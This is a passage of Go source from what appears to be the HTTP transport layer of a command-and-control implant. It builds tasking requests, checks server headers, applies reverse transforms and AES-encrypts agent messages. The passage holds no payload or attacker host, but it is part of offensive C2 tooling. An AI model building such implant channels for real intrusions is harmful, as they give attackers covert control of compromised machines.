	for key, _ := range variation.Client.Parameters {
		q.Add(key, variation.Client.Parameters[key])
	}
	req.URL.RawQuery = q.Encode()
	return req, nil
}
func (c *C2HTTPx) GetDynamicMessageResponse(resp *http.Response, isGetTaskingRequest bool) ([]byte, error) {
	body, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	// now that we have the body of the message response, we need to fetch out the response from it
	if err != nil {
		return nil, err
	}
	// verify that the server sent back everything we're expecting
	var variation AgentVariationConfig
	if isGetTaskingRequest {
		variation = c.Config.Get
	} else {
		variation = c.Config.Post
	}
	for key, _ := range variation.Server.Headers {
		if variation.Server.Headers[key] != resp.Header.Get(key) {
			utils.PrintDebug(fmt.Sprintf("Header '%s' is different from server and expected! %s vs %s", key, variation.Server.Headers[key], resp.Header.Get(key)))
			//return nil, errors.New("header mismatch from server")
		}
	}
	return c.performReverseTransforms(body, variation)
}

func (c *C2HTTPx) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}
func (c *C2HTTPx) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
